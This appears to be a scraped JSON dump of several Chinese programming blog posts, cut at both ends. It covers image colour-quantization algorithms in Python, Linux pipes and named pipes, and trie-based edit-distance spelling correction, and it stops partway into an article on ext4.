,vbox0,),),\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n\n,\n,除此之外，算法中最重要的部分是统计色彩分布直方图。我们需要将三维空间中的任意一点对应到一维坐标中的整数，这样才能以最快地速度定位这一颜色。如果采用全部的24位信息，那么我们用于保存直方图的数组长度至少要是$2^{24}=16777216$，既然是要提取颜色主题（或是颜色量化），我们可以将颜色由RGB各8位压缩至5位，这样数组长度只有$2^{15}=32768$：,\n,\n,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\ndef getColorIndex(self, r, g, b):\r\n    return (r << (2 * self.SIGBITS)) + (g << self.SIGBITS) + b\r\ndef getPixHisto(self):\r\n    pixHisto = np.zeros(1 << (3 * self.SIGBITS))\r\n    for y in range(self.h):\r\n        for x in range(self.w):\r\n            r = self.pixData[y, x, 0] >> self.rshift\r\n            g = self.pixData[y, x, 1] >> self.rshift\r\n            b = self.pixData[y, x, 2] >> self.rshift\r\n\r\n            pixHisto[self.getColorIndex(r, g, b)] += 1\r\n    return pixHisto,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,12,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,def ,getColorIndex,(,self,,, ,r,,, ,g,,, ,b,),:,    ,return, ,(,r, ,<<, ,(,2, ,*, ,self,.,SIGBITS,),), ,+, ,(,g, ,<<, ,self,.,SIGBITS,), ,+, ,b,def ,getPixHisto,(,self,),:,    ,pixHisto, ,=, ,np,.,zeros,(,1, ,<<, ,(,3, ,*, ,self,.,SIGBITS,),),    ,for, ,y, ,in, ,range,(,self,.,h,),:,        ,for, ,x, ,in, ,range,(,self,.,w,),:,            ,r, ,=, ,self,.,pixData,[,y,,, ,x,,, ,0,], ,>>, ,self,.,rshift,            ,g, ,=, ,self,.,pixData,[,y,,, ,x,,, ,1,], ,>>, ,self,.,rshift,            ,b, ,=, ,self,.,pixData,[,y,,, ,x,,, ,2,], ,>>, ,self,.,rshift, ,            ,pixHisto,[,self,.,getColorIndex,(,r,,, ,g,,, ,b,),], ,+=, ,1,    ,return, ,pixHisto,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n\n,\n,分别对4张图片进行切分、提取：,\n,\n,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\ndef testMMCQ(pixDatas, maxColor):\r\n    start  = time.process_time()\r\n    themes = list(map(lambda d: MMCQ(d, maxColor).quantize(), pixDatas))\r\n    print(\"MMCQ Time cost: {0}\".format(time.process_time() - start))\r\n    return themes\r\nimgs = map(lambda i: 'imgs/photo%s.jpg' % i, range(1,5))\r\npixDatas = list(map(getPixData, imgs))\r\nmaxColor = 7\r\n\r\nthemes = [testMMCQ(pixDatas, maxColor)]\r\nimgPalette(pixDatas, themes, [\"MMCQ Palette\"]),\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,def ,testMMCQ,(,pixDatas,,, ,maxColor,),:,    ,start,  ,=, ,time,.,process_time,(,),    ,themes, ,=, ,list,(,map,(,lambda, ,d,:, ,MMCQ,(,d,,, ,maxColor,),.,quantize,(,),,, ,pixDatas,),),    ,print,(,\"MMCQ Time cost: {0}\",.,format,(,time,.,process_time,(,), ,-, ,start,),),    ,return, ,themes,imgs, ,=, ,map,(,lambda, ,i,:, ,'imgs/photo%s.jpg', ,%, ,i,,, ,range,(,1,,,5,),),pixDatas, ,=, ,list,(,map,(,getPixData,,, ,imgs,),),maxColor, ,=, ,7, ,themes, ,=, ,[,testMMCQ,(,pixDatas,,, ,maxColor,),],imgPalette,(,pixDatas,,, ,themes,,, ,[,\"MMCQ Palette\",],),\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n\n,\n,\n,1.2. 八叉树算法（Octree）,\n,八叉树算法的原理可以参考这篇文章：,圖片主題色提取算法小結,。作者也提供了 Js 实现的代码，虽然与 Leptonica 中 C 实现的方法差别很大，但原理上是一致的。,\n,建立八叉树的原理实际上跟上面提到的统计直方图有些相似，将颜色成分转换成二进制之后，较低位（八叉树中位置较深层）数值将被压缩进较高位（八叉树中较浅层）。八叉树算法应用到主题色提取可能存在的问题是，每次削减掉的叶子数不确定，但是新增加的只有一个，这就导致我们需要的主题色数量并不一定刚好得到满足，例如设定的主题色数量为7，可能上一次叶子时总数还有10个，到了下一次只剩5个了。类似的问题在后面手动实现的KMeans算法中也有出现，为了保证可以得到足够的主题色，不得不强行提高算法中的颜色数量，然后取图像中包含数量较多的作为主题色：,\n,\n,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\ndef getColors(self, node):\r\n      if node.isLeaf:\r\n          [r, g, b] = list(map(lambda n: int(n[0] / n[1]), zip([node.r, node.g, node.b], [node.n]*3)))\r\n          self.theme.append([r,g,b, node.n])\r\n      else:\r\n          for i in range(8):\r\n              if node.children[i] is not None:\r\n                  self.getColors(node.children[i])\r\nself.theme = sorted(self.theme, key=lambda c: -1*c[1])\r\nreturn list(map(lambda l: l[:-1],self.theme[:self.maxColor])),\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,def ,getColors,(,self,,, ,node,),:,      ,if, ,node,.,isLeaf,:,          ,[,r,,, ,g,,, ,b,], ,=, ,list,(,map,(,lambda, ,n,:, ,int,(,n,[,0,], ,/, ,n,[,1,],),,, ,zip,(,[,node,.,r,,, ,node,.,g,,, ,node,.,b,],,, ,[,node,.,n,],*,3,),),),          ,self,.,theme,.,append,(,[,r,,,g,,,b,,, ,node,.,n,],),      ,else,:,          ,for, ,i, ,in, ,range,(,8,),:,              ,if, ,node,.,children,[,i,], ,is, ,not, ,None,:,                  ,self,.,getColors,(,node,.,children,[,i,],),self,.,theme, ,=, ,sorted,(,self,.,theme,,, ,key,=,lambda, ,c,:, ,-,1,*,c,[,1,],),return, ,list,(,map,(,lambda, ,l,:, ,l,[,:,-,1,],,,self,.,theme,[,:,self,.,maxColor,],),),\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n\n,\n,对比上面两种算法的结果：,\n,\n,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\ndef testOQ(pixDatas, maxColor):\r\n    start  = time.process_time()\r\n    themes = list(map(lambda d: OQ(d, maxColor).quantize(), pixDatas))\r\n    print(\"OQ Time cost: {0}\".format(time.process_time() - start))\r\n    return themes\r\nthemes = [testMMCQ(pixDatas, maxColor), testOQ(pixDatas, maxColor)]\r\nimgPalette(pixDatas, themes, [\"MMCQ Palette\", \"OQ Palette\"]),\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,def ,testOQ,(,pixDatas,,, ,maxColor,),:,    ,start,  ,=, ,time,.,process_time,(,),    ,themes, ,=, ,list,(,map,(,lambda, ,d,:, ,OQ,(,d,,, ,maxColor,),.,quantize,(,),,, ,pixDatas,),),    ,print,(,\"OQ Time cost: {0}\",.,format,(,time,.,process_time,(,), ,-, ,start,),),    ,return, ,themes,themes, ,=, ,[,testMMCQ,(,pixDatas,,, ,maxColor,),,, ,testOQ,(,pixDatas,,, ,maxColor,),],imgPalette,(,pixDatas,,, ,themes,,, ,[,\"MMCQ Palette\",,, ,\"OQ Palette\",],),\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n\n,\n,\n,可见八叉树算法可能更适合用于提取调色板，而且两种算法运行时间差异也很明显：,\n,\n,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n#MMCQ Time cost: 8.238793\r\n\r\n#OQ Time cost: 55.173573,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,#MMCQ Time cost: 8.238793, ,#OQ Time cost: 55.173573,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n\n,\n,除了OQ中采用较多递归以外，未对原图进行抽样处理也是其中原因之一。,\n,2. 聚类,\n,聚类是一种无监督式机器学习算法，我们这里采用K均值算法。虽然说是“机器学习”听起来时髦些，但算法本质上比上面两种更加简单粗暴。,\n,KMeans算法,\n,KMeans算法的原理更加简洁：“物以类聚”。我们目的是将一堆零散的数据（如上面图2）归为k个类别，使得每个类别中的每个数据样本，距离该类别的中心（质心，centroid）距离最小，数学公式为：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ $ \\sum_{i=0}^N \\min_{ \\mu_j \\in C} (||x_i - \\mu_j||^2) $ $,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,$, ,\\,sum_,{,i,=,0,},^,N, ,\\,min_,{, ,\\,mu,_,j, ,\\,in, ,C,}, ,(,||,x_i, ,-, ,\\,mu_j,||,^,2,), ,$, ,$,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,上文提到八叉树算法可能出现结果与主题色数量不一致的情况，在KMeans算法中，初始的k个类别的质心的选择也可能导致类似的问题。当采用随机选择的方法时，有可能出现在迭代过程中，选择的中心点距离所有其它数据太远而最终导致被孤立。这里分别采用手动实现和,scikit-learn,的方法实现，根据,scikit-learn 提供的API,，完成主题色的提取大概只需要几行代码：,\n,\n,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nfrom sklearn.cluster import KMeans as KM\r\nimport numpy as np\r\n\r\n#@pixData      image pixels stored in numpy.ndarray\r\n#@maxColor     theme color number\r\nh, w, d = pixData.shape\r\ndata = np.reshape((h*w, d))\r\nkm = KM(n_clusters=maxColor)\r\nkm.fit(data)\r\ntheme = np.array(km.cluster_centers_, dtype=np.uint8),\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,from ,sklearn,.,cluster ,import ,KMeans ,as, ,KM,import ,numpy ,as, ,np, ,#@pixData      image pixels stored in numpy.ndarray,#@maxColor     theme color number,h,,, ,w,,, ,d, ,=, ,pixData,.,shape,data, ,=, ,np,.,reshape,(,(,h*,w,,, ,d,),),km, ,=, ,KM,(,n_clusters,=,maxColor,),km,.,fit,(,data,),theme, ,=, ,np,.,array,(,km,.,cluster_centers_,,, ,dtype,=,np,.,uint8,),\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n\n,\n,\n,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nimgs = map(lambda i: 'imgs/photo%s.jpg' % i, range(1,5))\r\npixDatas = list(map(getPixData, imgs))\r\nmaxColor = 7\r\nthemes = [testKmeans(pixDatas, maxColor), testKmeans(pixDatas, maxColor, useSklearn=False)]\r\nimgPalette(pixDatas, themes, [\"KMeans Palette\", \"KMeans DIY\"]),\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,imgs, ,=, ,map,(,lambda, ,i,:, ,'imgs/photo%s.jpg', ,%, ,i,,, ,range,(,1,,,5,),),pixDatas, ,=, ,list,(,map,(,getPixData,,, ,imgs,),),maxColor, ,=, ,7,themes, ,=, ,[,testKmeans,(,pixDatas,,, ,maxColor,),,, ,testKmeans,(,pixDatas,,, ,maxColor,,, ,useSklearn,=,False,),],imgPalette,(,pixDatas,,, ,themes,,, ,[,\"KMeans Palette\",,, ,\"KMeans DIY\",],),\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n\n,\n,测试比较手动实现和scikit-learn的结果如下：,\n,\n,好吧我承认很惨，耗时方面也是惨不忍睹。,\n,3. 色彩建模,\n,从上面几种算法结果来看，MMCQ和 KMeans在时间和结果上都还算不错，但仍有改进的空间。如果从人类的角度出发，两种算法的策略或者说在解决主题色提取这一问题时采纳的特征（feature）都接近于颜色密度，即相近的颜色凑在一起数量越多，越容易被提取为主题颜色。,\n,最后要提到的算法来自,斯坦福可视化组,13年的一篇研究：,Modeling how people extract color themes from images,，实际上比较像一篇心理学研究的套路：建模-找人类被试进行行为实验-调参拟合。文章提取了图像中的79个特征变量并进行多元回归，同时找到普通人类被试和艺术系学生对图像的主题颜色进行选择，结果证明特征+回归能够更好地拟合人类选择的结果。,\n,\n,79个特征的多元回归模型，不知道会不会出现过度拟合？另外虽然比前面算法多了很多特征，但仍旧多物理特征。对人类观察者来说，我们看到的并非一堆无意义的色块，虽然有研究表明颜色信息并非场景识别的必要线索，但反过来场景图像中的语义信息却很有可能影响颜色对观察者的意义，这大概就是心理学研究与计算机科学方向上的差异。,\n,总结,\n,以上算法若要应用还需更多优化，例如先抽样再处理，计算密集的地方用C/C++或并行等。另外需要一个对Python每个函数执行时间进行记录的工具，分析运行时间长的部分。,\n,参考,\n,\n,Color Quantization,\n,Color quantization using modified median cut,\n,Median-Cut Color Quantization,\n,Wicked Code,\n,Clustering – scikit-learn,\n,Color Quantization using K-Means,\n,Extract Color Themes from Images,\n,Lin, S., & Hanrahan, P. (2013). Modeling how people extract color themes from images. Proc of Chi Acm, 3101-3110.,\n,\n,\n\r\n        \r\n        \r\n        \n    ,\n        , ,1, 赞,\n        , 1 收藏,\n\n                    ,  评论,\n        \n        \n        \n        ,\n        ,\n            ,\n            ,\n            ,\n            ,\n            ,\n        ,\n\n    ,\n\n\n\n\r\n        ,\r\n\r\n\r\n,\r\n\t", "url": "http://blog.jobbole.com/114372/", "url_object_id": "582691a82cdbe6482c80bd5c2a4ba07c", "front_image_path": "full/f988bd35264f4e1d427950ba55f20e8480fc812e.jpg"},{"front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/09/a836f3cdf91cb1dcf551a3cd4f561da6.jpg"], "title": "介绍 Linux 中的管道和命名管道", "create_time": "2018/09/12", "vote": "1", "bookmark": 0, "comments": 0, "content": "\r\n\r\n        \t\t\t,\n\t\t\r\n\t\t,原文出处： ,Archit Modi,   译文出处：,Linux中国/geekpi,   ,要在命令间移动数据？使用管道可使此过程便捷。,\n,\n,在 Linux 中，,pipe, 能让你将一个命令的输出发送给另一个命令。管道，如它的名称那样，能重定向一个进程的标准输出、输入和错误到另一个进程，以便于进一步处理。,\n,“管道”（或称“未命名管道”）命令的语法是在两个命令之间加上 ,|, 字符：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nCommand-1 | Command-2 | ...| Command-N,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,Command,-,1, ,|, ,Command,-,2, ,|, ,.,.,.,|, ,Command,-,N,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,这里，该管道不能通过另一个会话访问；它被临时创建用于接收 ,Command-1, 的执行并重定向标准输出。它在成功执行之后删除。,\n,\n,在上面的示例中，,contents.txt, 包含特定目录中所有文件的列表 —— 具体来说，就是 ,ls -al, 命令的输出。我们首先通过管道（如图所示）使用 “file” 关键字从 ,contents.txt, 中 ,grep, 文件名，因此 ,cat, 命令的输出作为 ,grep, 命令的输入提供。接下来，我们添加管道来执行 ,awk, 命令，该命令显示 ,grep, 命令的过滤输出中的第 9 列。我们还可以使用 ,wc -l, 命令计算 ,contents.txt, 中的行数。,\n,只要系统启动并运行或直到它被删除，命名管道就可以持续使用。它是一个遵循 ,FIFO,（先进先出）机制的特殊文件。它可以像普通文件一样使用。也就是，你可以写入，从中读取，然后打开或关闭它。要创建命名管道，命令为：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nmkfifo <pipe-name>,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,mkfifo, ,<,pipe,-,name,>,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,这将创建一个命名管道文件，它甚至可以在多个 shell 会话中使用。,\n,创建 FIFO 命名管道的另一种方法是使用此命令：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nmknod p <pipe-name>,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,mknod, ,p, ,<,pipe,-,name,>,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,要重定向任何命令的标准输出到其它命令，请使用 ,>, 符号。要重定向任何命令的标准输入，请使用 < ,符号。,\n,\n,如上所示，,ls -al, 命令的输出被重定向到 ,contents.txt, 并插入到文件中。类似地，,tail, 命令的输入通过 < ,符号从 ,contents.txt, 读取。,\n,\n,\n,这里，我们创建了一个命名管道 ,my-named-pipe,，并将 ,ls -al, 命令的输出重定向到命名管道。我们可以打开一个新的 shell 会话并 ,cat, 命名管道的内容，如前所述，它显示了 ,ls -al, 命令的输出。请注意，命名管道的大小为零，并有一个标志 “p”。,\n,因此，下次你在 Linux 终端上使用命令并在命令之间移动数据时，希望管道使这个过程快速简便。,\n, ,\n\r\n        \r\n        \r\n        \n    ,\n        , ,1, 赞,\n        ,  收藏,\n\n                    ,  评论,\n        \n        \n        \n        ,\n        ,\n            ,\n            ,\n            ,\n            ,\n            ,\n        ,\n\n    ,\n\n\n\n\r\n        ,\r\n\r\n\r\n,\r\n\t", "url": "http://blog.jobbole.com/114379/", "url_object_id": "8470a72bff4d46a52fb85dff84f81bb0", "front_image_path": "full/ebb531e935e6b4104066e717fdb1714374f9be55.jpg"},{"front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/06/03b5b99cd8b93d7c062277c5de23570b.jpg"], "title": "基于海量词库的单词拼写检查、推荐到底是咋做的？", "create_time": "2018/09/07", "vote": "1", "bookmark": "1", "comments": 0, "content": "\r\n\r\n        \t\t\t,\n\t\t\r\n\t\t,原文出处： ,haolujun,   ,\n,前言,\n,在我们日常应用中，应该遇到不少类似的状况：,\n,\n,写文档时，单词拼写错误后，工具自动推荐一个相似且正确的拼写形式；,\n,使用搜狗输入法时，敲错某个字的拼音照样能够打出我们想要的汉字；,\n,利用搜索引擎进行搜索时，下拉框中自动列出与输入相近的词语。,\n,等等，不一一列举。,\n,\n,这种功能是如何实现的呢？里面用到了哪些算法呢？本文就来介绍一个能够完成这个任务的算法。,\n,问题描述,\n,其实，这几个问题都能够转换成同一个问题：即对于给定的输入字符串T，在预先准备好的模式串集合Q中找到与输入串相似的模式串子集。,\n,那么如何得到准备好的这些模式串集合呢？我们可以通过数据挖掘等一些机制来得到。,\n,那么接下来的问题就是如何快速的从这个集合中找到与输入串相似的字符串？通常我们用最小编辑距离来表示两个字符串的相似程度。,\n,例如，对于输入串T，我们限制错误数小于等于2，即在预先准备好的模式集合中找所有与输入串编辑距离小于等于2的字符串。,\n,有什么算法能够快速完成这个任务呢？,\n,暴力算法,\n,遍历集合Q中的每个模式串P，分别计算其与输入串T的最小编辑距离，如果编辑距离小于指定的错误容忍度x，则输出这个模式串。,\n,\n,时间复杂度：O(|Q| * n * m)，当|Q|很大时，速度将会很慢。,\n,\n,那么这个算法可以优化么？可以！,\n,比如，第一个字很少有人输入错，所以我们可以在模式串集合Q中只对第一个字与输入串第一个字相同的那些字符串进行相似度计算，这样就能够减少相当多的算量，是一个可行方法。,\n,但是这也有问题，假若少部分人确实第一个字输入错了，那么这个算法找到的所有串也是错的，不能达到纠错的效果。,\n,所以，针对首字符过滤的优化算法有一定的局限性。,\n,步步优化,\n,我们仔细思考这个问题，由于模式串Q是一个集合，那么其中必定有大量的模式串有共同的前缀。能否利用这个前缀进行优化呢？,\n,优化1： 利用两个词的相同前缀进行优化,\n,比如：字符串 explore和explain，他们有公共的前缀，这就意味着他们与字符串explode的编辑矩阵的前几列值是相同的，不用重复计算，如下图红色部分所示。,\n,\n,explore与explain无论与任何字符串计算编辑距离，编辑矩阵的前4列肯定一模一样。所以，如果我们已经计算过explore与某个串的编辑距离后，那么当计算该串与explain的编辑距离时，前4列可以复用，直接从第五列开始计算。,\n,到此，我们得到一个新的算法计算多模式的编辑距离：把模式串集合建立成一棵字典树，深度优先遍历这棵树，在遍历的过程中，不断更新编辑矩阵的某一个列，如果到达的节点是一个终结符，并且T与P（路径上的字符形成的字符串）的编辑距离小于指定的容忍度，则找到一个符合条件的串。,\n,优化2：剪枝,\n,虽然我们利用词前缀优化了算法，能够避免拥有相同前缀模式串的编辑矩阵的重复计算，但是必须要遍历所有节点。有没有什么办法能够在计算到某一深度后，根据一些限制条件能够剪去该子树其它剩余节点的计算呢？在搜索算法中，这种优化叫做剪枝。接下来我们讨论一下该如何设计一个剪枝函数。,\n,重新审视我们的编辑距离定义，其实可以看成是把字符串P和T分别拆分成两段，然后计算对应的段的编辑距离之和，如下图所示。,\n,\n,字符串P和T分别拆分成两段，红色和绿色。红色部分之间的编辑距离与绿色部分之间的编辑距离之和即为字符串P和T的编辑距离。,\n,举个例子，更形象：,\n,\n,例子1,\n,\n,\n,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\ned(\"explore\", \"express\") = ed(\"explo\", \"exp\") + ed(\"re\", \"ress\"),\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,ed,(,\"explore\",,, ,\"express\",), ,=, ,ed,(,\"explo\",,, ,\"exp\",), ,+, ,ed,(,\"re\",,, ,\"ress\",),\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n,\n,例子2,\n,\n,\n,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\ned(\"explore\", \"express\") = ed(\"exp\", \"exp\") + ed(\"lore\", \"ress\"),\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,ed,(,\"explore\",,, ,\"express\",), ,=, ,ed,(,\"exp\",,, ,\"exp\",), ,+, ,ed,(,\"lore\",,, ,\"ress\",),\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n,\n,例子3,\n但是，并不是每种划分都是正确的，比如下面图所示：,\n,\n,\n,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\ned(\"ex\",\"exp\") + ed(\"plore\", \"ress\") = 1 + 4 = 5,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,ed,(,\"ex\",,,\"exp\",), ,+, ,ed,(,\"plore\",,, ,\"ress\",), ,=, ,1, ,+, ,4, ,=, ,5,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,所以，最小编辑距离问题又相当于一个最优拆分，即对于字符串P中位置为i的字符，找到在T中的一个最优位置j，使得,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\ned(P.prefix(i), T.prefix(j)) + ed(P.suffix(i+1), T.suffix(j+1)),\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,ed,(,P,.,prefix,(,i,),,, ,T,.,prefix,(,j,),), ,+, ,ed,(,P,.,suffix,(,i,+,1,),,, ,T,.,suffix,(,j,+,1,),),\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,最小。,\n,回到我们这个问题中来，如果我们限制P和T的最小编辑距离小于等于x，,\n,\n,我们让 p[i]分别匹配t[i-x],t[i-x+1],……,t[i],t[i+1],……t[i+x]，并找到其中前半段匹配的最小的编辑距离ed1=ed(p[1~i],t[1~j])，如果ed1大于x，我们则能推断出ed(p,t)也终将大于x（ed=ed1+ed2>x）。,\n,为什么p[i]不匹配t[i-x-1]以及之前的位置呢？那是因为ed(p.prefix(i), t.prefix(i-x-1)) > x，因为必须至少在t.prefix(i-x-1)中插入x+1个字符才能保证字符串长度相等；同理p[i]也不能匹配t[i+x+1]及其之后的位置。所以，根据分段原则，最优匹配肯定出现在t[i-x] ~ t[i+x]之间，如果这个区间的最小编辑距离都大于x，那么我们无需对p[i+1]及其之后的字符进行匹配计算。,\n,\n,例如：当遍历到蓝色节点l时，路径形成的字符串expl与T=exist满足剪枝条件，则后序节点不需要遍历，因为后面不可能有任何一个字符串满足与T的编辑距离小于2。,\n,至此，我们得到了剪枝优化：深度遍历到达字典树的某个节点，其路径上的字符组成字符串P，计算其与T.prefix(i-x), T.prefix(i-x+1),……T.prefix(i+x)的最小编辑距离，如果其中的最小值大于x，则停止遍历这棵子树上的后面的节点。,\n,其实，这个最终版本的优化算法出自论文：,《Error-tolerant finite-state recognition with applications to morphological analysis and spelling correction》.K Oflazer:1996 ,\n,代码实现与效果对比,\n,代码实现需需要很强的技巧性，因为无论是剪枝函数还是进行最终确认函数都可以复用同一个编辑矩阵，贴一个很丑陋的代码：,https://github.com/haolujun/Algorithm/tree/master/muti-edit-distance,\n,这个算法在错误容忍度非常小的情况下效率非常高，我随机生成了10万个长度5~10的模式串，再随机生成100个输入串T（长度5 ~ 10），字符集大小为10，x最小编辑距离限制，计算多模式编辑距离，处理总时间如下，单位ms：,\n,\n,\n,\n,算法,\n,x = 1,\n,x = 2,\n,x = 3,\n,x = 4,\n,x = 5,\n,x = 6,\n,\n,\n,\n,\n,暴力算法,\n,21990,\n,21990,\n,21990,\n,21990,\n,21990,\n,21990,\n,\n,\n,优化算法,\n,97,\n,922,\n,4248,\n,11361,\n,20097,\n,28000,\n,\n,\n,\n,当容忍度很小时，优化算法完胜暴力算法，并且实际应用中x一般取值都非常小，正好适合优化算法。,\n,当x值增大，优化算法效率逐渐下降，并且最后慢于暴力算法，这是因为优化算法实现复杂导致（递归+更复杂的判断）。,\n,所以，最终应用时，我们根据x值选择不同的算法。,\n,\n\r\n        \r\n        \r\n        \n    ,\n        , ,1, 赞,\n        , 1 收藏,\n\n                    ,  评论,\n        \n        \n        \n        ,\n        ,\n            ,\n            ,\n            ,\n            ,\n            ,\n        ,\n\n    ,\n\n\n\n\r\n        ,\r\n\r\n\r\n,\r\n\t", "url": "http://blog.jobbole.com/114358/", "url_object_id": "4709f20bc9cfd6faeaaa14c497085b04", "front_image_path": "full/3ef52bc5d5cc6d23e102e0ce679d152bdd3b5cc7.jpg"},{"front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/09/623fff738e3b78d500adde9b8202bb80.jpg"], "title": "深入理解 ext4 等 Linux 文件系统", "create_time": "2018/09/12", "vote": "1", "bookmark": "1", "comments": 0, "content": "\r\n\r\n        \t\t\t,\n\t\t\r\n\t\t,原文出处： ,Jim Salter,   译文出处：,Linux中国/魑魅魍魉,   ,了解 ext4 的历史，包括其与 ext3 和之前的其它文件系统之间的区别。,\n,目前的大部分 Linux 文件系统都默认采用 ext4 文件系统，正如以前的 Linux 发行版默认使用 ext3、ext2 以及更久前的 ext。,\n,对于不熟悉 Linux 或文件系统的朋友而言，你可能不清楚 ext4 相对于上一版本 ext3 带来了什么变化。你可能还想知道在一连串关于替代的文件系统例如 Btrfs、XFS 和 ZFS 不断被发布的情况下，ext4 